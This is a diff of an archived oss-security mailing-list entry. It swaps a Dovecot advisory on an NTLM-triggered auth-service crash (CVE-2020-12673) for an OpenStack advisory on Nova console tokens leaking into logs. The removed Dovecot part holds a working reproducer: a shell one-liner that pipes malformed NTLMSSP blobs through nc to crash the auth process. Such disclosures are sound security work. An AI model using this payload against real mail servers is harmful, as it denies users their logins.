@@ -1,54 +1,58 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/08/12/2
-Message-ID: <dd509a99-f78b-dd33-eca9-f0404dd6e1a2@dovecot.fi>
-Date: Wed, 12 Aug 2020 16:10:04 +0300
-From: Aki Tuomi <aki.tuomi@...ecot.fi>
-To: oss-security <oss-security@...ts.openwall.com>, full-disclosure <full-disclosure@...ts.openwall.com>
-Subject: CVE-2020-12673: Dovecot IMAP server: Specially crafted NTLM package can crash auth service
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/02/19/2
+Message-ID: <20200219171416.vofjngtntxvlocx2@yuggoth.org>
+Date: Wed, 19 Feb 2020 17:14:16 +0000
+From: Jeremy Stanley <fungi@...goth.org>
+To: oss-security@...ts.openwall.com
+Subject: [OSSA-2020-001] Nova can leak consoleauth token into log files (CVE-2015-9543)
 Content-Type: text/plain; charset=utf-8
 
-Open-Xchange Security Advisory 2020-08-12
+=============================================================
+OSSA-2020-001: Nova can leak consoleauth token into log files
+=============================================================
 
-Affected product: Dovecot IMAP server
-Internal reference: DOP-1870 (Bug ID)
-Vulnerability type: CWE-789 (Uncontrolled Memory Allocation)
-Vulnerable version: 2.2
-Vulnerable component: auth
-Fixed version: 2.3.11.3
-Report confidence: Confirmed
-Solution status: Fix available
-Vendor notification: 2020-05-03
-CVE reference: CVE-2020-12673
-CVSS: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)
-
-Vulnerability Details:
-Dovecot's NTLM implementation does not correctly check message buffer
-size, which leads to reading past allocation which can lead to crash.
-
-Risk:
-An adversary can use this vulnerability to crash dovecot auth process
-repeatedly, preventing login.
-
-Steps to reproduce:
-(echo 'AUTH NTLM'; echo -ne
-'NTLMSSP\x00\x01\x00\x00\x00\x00\x02\x00\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
-| \
-base64 -w0 ;echo ;echo -ne
-'NTLMSSP\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00AA\x00\x00\x41\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00orange\x00'|
-\
-base64 -w0;echo ; echo QUIT)  | nc 127.0.0.1 110
-
-Workaround:
-Disable NTLM authentication.
-
-Solution:
-Upgrade to fixed version.
-
-Best regards,
-Aki Tuomi
-Open-Xchange oy
+:Date: February 19, 2020
+:CVE: CVE-2015-9543
 
 
+Affects
+~~~~~~~
+- Nova: <18.2.4,>=19.0.0<19.1.0,>=20.0.0<20.1.0
 
 
-Download attachment "signature.asc" of type "application/pgp-signature" (489 bytes)
+Description
+~~~~~~~~~~~
+Paul Carlton from HP reported a vulnerability in Nova. An attacker
+with read access to the serviceâ€™s logs may obtain tokens used for
+console access. All Nova setups using novncproxy are affected.
+
+
+Patches
+~~~~~~~
+- https://review.opendev.org/707845 (Queens)
+- https://review.opendev.org/704255 (Rocky)
+- https://review.opendev.org/702181 (Stein)
+- https://review.opendev.org/696685 (Train)
+- https://review.opendev.org/220622 (Ussuri)
+
+
+Credits
+~~~~~~~
+- Paul Carlton from HP (CVE-2015-9543)
+
+
+References
+~~~~~~~~~~
+- https://launchpad.net/bugs/1492140
+- http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9543
+
+
+Notes
+~~~~~
+- The stable/queens branch is under extended maintenance and will receive no
+  new point releases, but a patch for it is provided as a courtesy.
+
+-- 
+Jeremy Stanley, on behalf of OpenStack Vulnerability Management
+
+Download attachment "signature.asc" of type "application/pgp-signature" (964 bytes)
